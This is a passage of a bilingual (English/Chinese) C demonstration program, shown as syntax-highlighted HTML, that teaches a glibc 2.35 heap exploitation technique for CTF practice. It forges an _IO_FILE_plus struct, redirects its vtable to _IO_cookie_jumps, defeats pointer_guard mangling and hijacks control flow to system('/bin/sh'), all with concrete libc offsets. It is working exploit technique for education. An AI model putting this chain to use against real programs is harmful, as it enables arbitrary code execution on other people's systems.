class="string">&quot;\033[34mtypedef struct\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *tcb;\t\t/* Pointer to the TCB.  Not necessarily the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t\t   thread descriptor used by libpthread.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  dtv_t *dtv;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *self;\t\t/* Pointer to the thread descriptor.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int multiple_threads;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int gscope_flag;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t sysinfo;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t stack_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t pointer_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long int unused_vgetcpu_cache[2];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Bit 0: X86_FEATURE_1_IBT.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     Bit 1: X86_FEATURE_1_SHSTK.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned int feature_1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int __glibc_unused1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Reservation of some values for the TM ABI.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_tm[4];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* GCC split stack support.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_ss;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The lowest address of shadow stack,  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long long int ssp_base;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Must be kept even if it is no longer used by glibc since programs,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     like AddressSanitizer, depend on the size of tcbhead_t.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__padding[8];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125; tcbhead_t;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can see that the stack guard is right above the pointer guard, so we can&#x27;t absolutely change the stack_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以发现stack_guard就在pointer_guard的上面，因此我们绝对不能修改stack_guard的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mLet&#x27;s calculate the address of pointer_guard: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m让我们计算一下pointer_guard的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* pointer_guard_address = (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of pointer_guard is: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpointer_guard的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn CTF problems you can&#x27;t always get the original value of pointer_guard, but you can also change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF赛题中你可能不能获取到pointer_guard的值，但你可以将其改写为一个已知值。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOK, now we can try to forge a _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m那么现在我们就来开始伪造_IO_FILE结构体。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAttention: what we forge is actually _IO_FILE_plus struct, which contains a _IO_FILE struct and a vtable pointer(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意：我们伪造的实际上是_IO_FILE_plus结构体，其包含_IO_FILE结构体的所有内容以及一个vtable指针(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_file_struct = (<span class="keyword">struct</span> _IO_FILE*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* vtable = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="built_in">sizeof</span> (<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mWe just allocate a fake _IO_FILE_plus struct into the heap: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m我们刚刚分配了一个假的_IO_FILE_plus结构体到堆: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of fake _IO_FILE_plus is: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个假的_IO_FILE_plus结构体的地址为: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of vtable pointer is: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mvtable指针的地址为: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we are going to change the value of _lock and vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来修改_lock和vtable指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe _lock should be changed into \033[31m_IO_stdfile_1_lock\033[32m, which is in \033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m_lock的值应该被修改为\033[31m_IO_stdfile_1_lock\033[32m, 它的地址为\033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe vtable should be changed into \033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;which points to function \033[31m_IO_file_xsputn.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mvtable指针应该被修改为\033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;其指向函数\033[31m_IO_file_xsputn.\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    fake_file_struct-&gt;_lock = (<span class="type">void</span> *) (libc_base + <span class="number">0x21ba70</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    *vtable = (<span class="type">size_t</span>)(libc_base + <span class="number">0x215b80</span> + <span class="number">0x38</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n\n&quot;</span>, *vtable);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* top_chunk_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThrough pwndbg, we can see that the size of top chunk is at fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m通过pwndbg我们可以看到top chunk的大小保存在fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size is: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mtop chunk的大小top_chunk-&gt;size为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 2617, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n&quot;</span></span><br><span class="line">         <span class="string">&quot;          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           prev_inuse (old_top) &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBecause in malloc.c there is a #define statement: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因为在malloc.c中有一个#define语句: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 292, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t __malloc_assert(assertion, file, line, function)\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe content of function __malloc_assert is: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__malloc_assert函数的内容为: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 297, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic void\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__malloc_assert (const char *assertion, const char *file, unsigned int line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t const char *function)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  (void) __fxprintf (NULL, \&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     __progname, __progname[0] ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     file, line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     function ? function : \&quot;\&quot;, function ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     assertion);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  fflush (stderr);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  abort ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhile in function __fxprintf, it will utilize stderr to output something, and that is our chance.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m函数__fxprintf会利用stderr来输出错误信息，这就是我们利用的机会。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThrough forging fake _IO_FILE struct, we can turn to anywhere that can be executed.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m通过伪造_IO_FILE结构体，我们可以执行任意地址的代码。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe easiest way in CTF is turning the execution flow into one gadget.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF比赛中最简单的方法就是将执行流转到one_gadget中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut one gadgets in libc 2.35 all have many constraints, which we need to pay attention to.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但glibc 2.35版本的one gadget有很多的限制条件需要注意。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mMoreover, many problems today have sandboxes, where you cannot use the syscall EXECVE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m另外，现在的很多赛题都有沙箱，我们可能不能调用execve的系统调用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo stack pivoting may be the most common step in exploitation.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此栈迁移就是本方法利用中较为常用的手段了。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function __vxprintf_internal, which is called indirectly by __fxprintf, it will call function _IO_cookie_read: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__fxprintf函数会间接调用到__vxprintf_internal函数，后者会调用_IO_cookie_read函数: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe &#x27;r12&#x27; here is (_IO_cookie_jumps + 0x38), which is the value of *vtable we wrote in before.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的r12寄存器的值就是(_IO_cookie_jumps + 0x38), 这就是我们前面写的*vtable值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see in struct _IO_cookies_jump: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m就如_IO_cookies_jump中代码展示的这样: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 111, /libio/iofopncook.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic const struct _IO_jump_t _IO_cookie_jumps libio_vtable = &#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT_DUMMY,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(finish, _IO_file_finish),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(overflow, _IO_file_overflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(underflow, _IO_file_underflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(uflow, _IO_default_uflow),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(pbackfail, _IO_default_pbackfail),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsputn, _IO_file_xsputn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekoff, _IO_cookie_seekoff),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seekpos, _IO_default_seekpos),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(setbuf, _IO_file_setbuf),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(sync, _IO_file_sync),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(doallocate, _IO_file_doallocate),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(read, _IO_cookie_read),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(write, _IO_cookie_write),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(seek, _IO_cookie_seek),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(close, _IO_cookie_close),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(stat, _IO_default_stat),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  JUMP_INIT(imbue, _IO_default_imbue),\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32mpoints to \033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38) \033[32m指向的是\033[35m_IO_file_xsputn\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32mpoints to \033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m(_IO_cookie_jumps + 0x38 + 0x38) \033[32m指向的是\033[35m_IO_cookie_read\033[32m.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo here we let it call _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以这里我们让程序调用_IO_cookie_read函数.\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s have a look at _IO_cookie_read function.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m让我们看一下_IO_cookie_read函数的内容。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;_IO_cookie_read&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+4&gt;:\tmov    rax,QWORD PTR [rdi+0xe8]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+11&gt;:\tror    rax,0x11\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+15&gt;:\txor    rax,QWORD PTR fs:0x30\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+24&gt;:\ttest   rax,rax\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+27&gt;:\tje     &lt;_IO_cookie_read+38&gt;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+29&gt;:\tmov    rdi,QWORD PTR [rdi+0xe0]\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+36&gt;:\t\033[31mjmp    rax\033[34m\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+38&gt;:\tmov    rax,0xffffffffffffffff\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   &lt;_IO_cookie_read+45&gt;:\tret\033[0m\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAs you can see, it directly calls rax, and &#x27;rdi&#x27; here is actually our fake _IO_FILE_plus address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m可以看到，它直接call rax，这里的rdi实际上就是假的_IO_FILE_plus结构体的地址。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we can write any executable address into [rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此我们可以将任意可执行的地址写入到[rdi+0xe8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHowever, don&#x27;t forget some instructions in the middle.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但是，别忘了中间还有几条指令。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, you can see a &#x27;ror&#x27; instruction and a &#x27;xor&#x27; instruction that change the value of rax.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里你可以看到有一个ror指令和一个xor指令，这些指令会修改rax的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThat is actually a kind of protection strategy used in high versions of glibc ---- encrypting the address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这实际上是高版本glibc的一种保护方式——将地址进行简单加密。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHere, these two instruction is decrypting rax, first ror 11 bits, and second xor fs:0x30h, which is our \033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这里的这两条指令实际上是在解密rax，首先循环右移0x11位，然后异或fs:0x30h，这实际上就是\033[31mpointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow you know that why we need the value of pointer_guard, it&#x27;s important for us to encrypt executable address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m现在你应该知道为什么我们需要修改pointer_guard的值了，它对于地址的加密过程很重要。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe encryption algorithm is easy to get: first xor pointer_guard, and second rol 0x11 bits.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m加密方式很好推出来：首先异或pointer_guard，然后循环左移0x11位。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mPay attention to the instruction before &#x27;jmp rax&#x27;: mov rdi, QWORD PTR [rdi+0xe0]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意&#x27;jmp rax&#x27;之前的指令: mov rdi, QWORD PTR [rdi+0xe0]\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf there is not any sandbox, we can let rax=system() address, and [rdi+0xe0]=&#x27;/bin/sh&#x27; address.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果这里没有沙箱，我们可以让rax等于system函数地址，[rdi+0xe0]等于字符串/bin/sh的地址\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mElse, you can also fill it with &#x27;pcop&#x27; to trigger stack pivoting and open, read, write flag file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m否则，我们也可以填充pcop的地址来触发栈迁移，然后打开、读、写flag文件。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(mode == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35mYou chose the getshell mode.\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[35m你选择了getshell模式。\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we&#x27;ll write &#x27;/bin/sh&#x27; address into [rdi+0xe0] and encrypted system() address into [rdi+0xe8]\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们在[rdi+0xe0]处写入字符串/bin/sh的地址，将加密后的system函数地址写入[rdi+0xe8]处。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>** sh_addr = (<span class="type">char</span>**)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of string &#x27;/bin/sh&#x27; should be written in: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m字符串&#x27;/bin/sh&#x27;的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, sh_addr);</span><br><span class="line">        *sh_addr = sh;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%p\033[0m\n&quot;</span>, *sh_addr);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span>* system_addr = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0xe8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function system() should be written in: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m函数system()的地址应该被写到: \033[31m%p\n\033[0m&quot;</span>, system_addr);</span><br><span class="line">        *system_addr = (<span class="type">size_t</span>)system;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mNow the value of the pointer is: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m指针解引用的值为: \033[31m%#zx\033[0m\n&quot;</span>, *system_addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThen we need to let it xor with pointer_guard: \033[33m%#zx.\n\033[0m&quot;</span>, *pointer_guard_address);</span><br><span class="line">        <span class="built_in">printf</span>(<span 